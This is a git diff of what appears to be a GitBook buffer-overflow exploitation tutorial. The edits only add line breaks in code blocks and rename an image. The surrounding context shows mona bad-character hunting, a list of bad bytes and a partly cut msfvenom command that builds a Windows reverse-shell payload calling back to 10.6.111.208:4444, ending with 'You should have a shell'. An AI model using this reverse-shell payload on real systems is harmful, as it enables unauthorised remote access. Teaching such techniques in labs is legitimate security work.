@@ -188,7 +188,8 @@ Let's use mona now to find some bad chars!
 
 <figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
 
-<pre><code><strong>01</strong></code></pre>
+<pre><code><strong>01
+</strong></code></pre>
 
 1. Remove the bad char from the byte array
 2. Remove the character from exploit payload
@@ -348,7 +349,8 @@ Let's use mona now to find some bad chars!
 
 That means that the following are the exact bad chars we need:
 
-<pre><code><strong>\x00\x01\x11\x40\x5f\xb8\xee</strong></code></pre>
+<pre><code><strong>\x00\x01\x11\x40\x5f\xb8\xee
+</strong></code></pre>
 
 
 
@@ -409,4 +411,4 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.6.111.208 LPORT=4444 EXITFUNC=thr
 4. Go back to your exploit and run it
 5. You should have a shell
 
-<figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12) (1) (2).png" alt=""><figcaption></figcaption></figure>
